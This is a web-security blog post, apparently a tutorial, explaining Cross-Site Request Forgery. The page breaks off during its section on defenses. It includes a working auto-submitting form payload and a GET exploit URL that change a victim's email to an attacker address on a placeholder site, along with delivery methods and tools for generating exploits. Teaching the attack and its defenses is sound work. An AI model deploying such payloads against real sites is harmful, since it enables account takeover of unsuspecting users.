<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Guide to Cross-Site Request Forgery (CSRF)" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction to Cross-Site Request Forgery (CSRF)" />
<meta property="og:description" content="Introduction to Cross-Site Request Forgery (CSRF)" />
<link rel="canonical" href="http://localhost:4000/posts/csrf-guide" />
<meta property="og:url" content="http://localhost:4000/posts/csrf-guide" />
<meta property="og:site_name" content="Diogo Lages" />
<meta property="og:image" content="http://localhost:4000/assets/img/thumbnails/csrf-guide.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-02-23T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/thumbnails/csrf-guide.png" />
<meta property="twitter:title" content="Guide to Cross-Site Request Forgery (CSRF)" />
<meta name="twitter:site" content="@Diogo-Lages" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-02-23T00:00:00+00:00","datePublished":"2025-02-23T00:00:00+00:00","description":"Introduction to Cross-Site Request Forgery (CSRF)","headline":"Guide to Cross-Site Request Forgery (CSRF)","image":"http://localhost:4000/assets/img/thumbnails/csrf-guide.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/csrf-guide"},"url":"http://localhost:4000/posts/csrf-guide"}</script>
<!-- End Jekyll SEO tag -->


  <title>Guide to Cross-Site Request Forgery (CSRF) | Diogo Lages
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Diogo Lages">
<meta name="application-name" content="Diogo Lages">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/whoami.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Diogo Lages</a>
    <p class="site-subtitle fst-italic mb-0">You can't keep it a secret, because you're a good man</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/Diogo-Lages"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/diogo-lages/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
      

      
        <a
          href="https://tryhackme.com/p/DiogoLages"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-user-secret"></i>
        </a>
      
    
      

      
        <a
          href="https://osintframework.com/"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-fingerprint"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Guide to Cross-Site Request Forgery (CSRF)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Guide to Cross-Site Request Forgery (CSRF)</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1740268800"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb 23, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/thumbnails/csrf-guide.png" class="popup img-link preview-img shimmer"><img src="/assets/img/thumbnails/csrf-guide.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/diogo-lages">Diogo Lages</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4777 words"
>
  <em>26 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Guide to Cross-Site Request Forgery (CSRF)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Guide to Cross-Site Request Forgery (CSRF)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h1 id="introduction-to-cross-site-request-forgery-csrf">Introduction to Cross-Site Request Forgery (CSRF)</h1>

<h2 id="what-is-cross-site-request-forgery-csrf"><span class="me-2">What is Cross-Site Request Forgery (CSRF)?</span><a href="#what-is-cross-site-request-forgery-csrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn’t intend to. It exploits the trust that a website has in a user’s browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.</p>

<p>CSRF attacks bypass the <strong>same-origin policy</strong>, which is meant to prevent websites from interfering with each other, by forcing the user to make unintended requests to a site they are already authenticated on. This can lead to actions such as changing account settings, transferring money, or other malicious activities without the user’s consent.</p>

<hr />

<h2 id="how-does-csrf-work"><span class="me-2"><strong>How Does CSRF Work?</strong></span><a href="#how-does-csrf-work" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>For a CSRF attack to be successful, three key conditions must be met:</p>

<ol>
  <li>
    <p><strong>A Relevant Action</strong>:<br />
The attacker must have a reason to induce an action within the application, such as modifying user permissions or changing the user’s password. This action is often privileged or tied to user-specific data.</p>
  </li>
  <li>
    <p><strong>Cookie-Based Session Handling</strong>:<br />
The application must rely solely on session cookies to authenticate and identify the user. If the application uses cookies to track the session, the attacker can exploit this to make unauthorized requests on behalf of the user.</p>
  </li>
  <li>
    <p><strong>No Unpredictable Request Parameters</strong>:<br />
The action the attacker wants to induce must not require any parameters that are difficult or impossible for the attacker to guess. For example, if an attacker wants to change a user’s password, the function would be vulnerable if the attacker doesn’t need to know the user’s current password.</p>
  </li>
</ol>

<hr />

<h3 id="example-scenario"><span class="me-2">Example Scenario</span><a href="#example-scenario" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Consider an example where an application lets users change their email address. The request to change the email might look like this:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">30</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span>

email=wiener@normal-user.com
</pre></td></tr></tbody></table></code></div></div>

<p>This scenario meets the conditions for a CSRF attack:</p>

<ol>
  <li>
    <p><strong>Relevant Action</strong>:<br />
The attacker is interested in changing the user’s email, which could then lead to further control, such as triggering a password reset and gaining full access to the account.</p>
  </li>
  <li>
    <p><strong>Cookie-Based Session Handling</strong>:<br />
The request uses a session cookie to authenticate the user, and the application doesn’t have any other mechanisms, like anti-CSRF tokens, to validate the request. The browser automatically sends the session cookie with the request.</p>
  </li>
  <li>
    <p><strong>Predictable Parameters</strong>:<br />
The attacker can easily guess or know the request parameters required for the action (in this case, the new email address), allowing them to craft a malicious request.</p>
  </li>
</ol>

<hr />

<h3 id="malicious-html-example"><span class="me-2">Malicious HTML Example</span><a href="#malicious-html-example" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>With these conditions in place, the attacker can construct a web page containing the following HTML:</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If a victim user visits the attacker’s web page, the following steps will occur:</p>

<ol>
  <li>
    <p><strong>Triggering the Request</strong>:<br />
The attacker’s page will automatically trigger an HTTP request to the vulnerable website (e.g., the email change request).</p>
  </li>
  <li>
    <p><strong>Automatic Session Inclusion</strong>:<br />
If the user is already logged in to the vulnerable website, their browser will automatically include the session cookie with the request (assuming the SameSite cookie attribute isn’t in use).</p>
  </li>
  <li>
    <p><strong>Processing the Request</strong>:<br />
The vulnerable website will treat the request as if it were made by the victim user, process it normally, and carry out the action, such as changing the email address.</p>
  </li>
</ol>

<hr />

<p><strong>Note</strong>: While CSRF is often described in the context of cookie-based session handling, it can also apply in other cases where the application automatically includes user credentials in requests, such as in <strong>HTTP Basic authentication</strong> or <strong>certificate-based authentication</strong>. In these scenarios, attackers can exploit the same trust the website places in the user’s credentials to perform unauthorized actions.</p>

<h1 id="constructing-and-delivering-csrf-attacks">Constructing and Delivering CSRF Attacks</h1>

<h2 id="how-to-construct-a-csrf-attack"><span class="me-2"><strong>How to Construct a CSRF Attack</strong></span><a href="#how-to-construct-a-csrf-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Manually creating the HTML needed for a CSRF exploit can be cumbersome, especially when the desired request contains a large number of parameters or has quirks in its structure. Fortunately, tools like <strong>Burp Suite Professional</strong> and other free alternatives make it easier to generate CSRF exploits.</p>

<h3 id="steps-to-construct-a-csrf-exploit"><span class="me-2">Steps to Construct a CSRF Exploit:</span><a href="#steps-to-construct-a-csrf-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ol>
  <li>
    <p><strong>Select a Request</strong>:<br />
In Burp Suite Professional, select any request you want to test or exploit.</p>
  </li>
  <li>
    <p><strong>Generate CSRF PoC</strong>:<br />
From the right-click context menu, select <strong>Engagement tools / Generate CSRF PoC</strong>. Burp Suite will generate HTML that triggers the selected request (minus cookies, which are automatically added by the victim’s browser).</p>
  </li>
  <li>
    <p><strong>Fine-Tune the Attack</strong>:<br />
You can tweak various options in the CSRF PoC generator to handle unusual features of the request, such as custom headers or specific parameter formats.</p>
  </li>
  <li>
    <p><strong>Test the Exploit</strong>:<br />
Copy the generated HTML into a web page, view it in a browser logged into the vulnerable website, and verify whether the intended request is issued successfully and the desired action occurs.</p>
  </li>
</ol>

<hr />

<h3 id="free-tools-for-csrf-exploits"><span class="me-2">Free Tools for CSRF Exploits</span><a href="#free-tools-for-csrf-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>While <strong>Burp Suite Professional</strong> is a popular tool for generating CSRF exploits, there are free alternatives that work similarly:</p>

<ul>
  <li><strong>CSRFShark</strong>: <a href="https://csrfshark.github.io/">https://csrfshark.github.io/</a>
    <ul>
      <li>Simply copy the request from Burp Suite and paste it into CSRFShark, choosing HTTP/HTTPS depending on the website’s restrictions.</li>
    </ul>
  </li>
  <li><strong>Nakanosec CSRF Tool</strong>: <a href="https://tools.nakanosec.com/csrf/">https://tools.nakanosec.com/csrf/</a>
    <ul>
      <li>Another free tool that generates CSRF exploits based on HTTP requests.</li>
    </ul>
  </li>
</ul>

<hr />

<h3 id="example-csrf-exploit-code"><span class="me-2">Example CSRF Exploit Code</span><a href="#example-csrf-exploit-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Here’s an example of a simple CSRF exploit using HTML:</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When a victim visits this page, their browser will automatically submit the form, triggering the malicious request to change their email address.</p>

<hr />

<h2 id="how-to-deliver-a-csrf-exploit"><span class="me-2"><strong>How to Deliver a CSRF Exploit</strong></span><a href="#how-to-deliver-a-csrf-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The delivery mechanisms for CSRF attacks are quite similar to those for reflected XSS attacks. Below are common methods attackers use to deliver CSRF exploits:</p>

<h3 id="1-hosting-malicious-html"><span class="me-2">1. <strong>Hosting Malicious HTML</strong></span><a href="#1-hosting-malicious-html" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>The attacker hosts the malicious HTML on a website they control. When victims visit the site, their browsers automatically send the malicious request to the vulnerable website.</p>

<h3 id="2-inducing-victims-to-visit"><span class="me-2">2. <strong>Inducing Victims to Visit</strong></span><a href="#2-inducing-victims-to-visit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Attackers encourage victims to visit the malicious website by sending links via email, social media, or embedding the attack in high-traffic websites (e.g., user comment sections).</p>

<h3 id="3-self-contained-get-method-exploits"><span class="me-2">3. <strong>Self-Contained GET Method Exploits</strong></span><a href="#3-self-contained-get-method-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Some CSRF exploits use the <strong>GET method</strong> and can be fully contained within a single URL on the vulnerable website. In these cases, the attacker doesn’t need to rely on an external site and can directly send victims a malicious URL.</p>

<p>For example, if changing an email address can be done via a GET request, the exploit might look like this:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">https://vulnerable-website.com/email/change?email=pwned@evil-user.net
</span></pre></td></tr></tbody></table></code></div></div>

<p>When the victim visits this URL, their browser sends the malicious request to the vulnerable website.</p>

<hr />

<h2 id="common-defenses-against-csrf"><span class="me-2"><strong>Common Defenses Against CSRF</strong></span><a href="#common-defenses-against-csrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Successfully exploiting CSRF vulnerabilities typically requires bypassing anti-CSRF measures. Below are the most common defenses used to protect against CSRF attacks:</p>

<h3 id="1-csrf-tokens"><span class="me-2">1. <strong>CSRF Tokens</strong></span><a href="#1-csrf-tokens" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>A <strong>CSRF token</strong> is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request. This makes it difficult for attackers to forge a valid request.</p>

<h4 id="example-of-csrf-token-in-an-html-form"><span class="me-2">Example of CSRF Token in an HTML Form:</span><a href="#example-of-csrf-token-in-an-html-form" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/my-account/change-email"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"email"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"example@normal-website.com"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Update email<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When the form is submitted, the request includes the CSRF token:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/my-account/change-email</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">normal-website.com</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">70</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com
</pre></td></tr></tbody></table></code></div></div>

<p>If the token is missing or incorrect, the server rejects the request.</p>

<hr />

<h3 id="2-samesite-cookies"><span class="me-2">2. <strong>SameSite Cookies</strong></span><a href="#2-samesite-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p><strong>SameSite</strong> is a browser security feature that controls when cookies are sent with cross-site requests. Since actions requiring authenticated session cookies are often vulnerable to CSRF, setting SameSite restrictions (e.g., Lax or Strict) can block attackers from triggering actions from other websites.</p>

<ul>
  <li><strong>Strict</strong>: Cookies are only sent in a first-party context, meaning they won’t be included in any cross-site requests.</li>
  <li><strong>Lax</strong>: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).</li>
  <li><strong>None</strong>: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure” (i.e., transmitted over HTTPS).</li>
</ul>

<h4 id="example-of-setting-a-samesite-cookie"><span class="me-2">Example of Setting a SameSite Cookie:</span><a href="#example-of-setting-a-samesite-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-http highlighter-rouge"><div class="code-header">
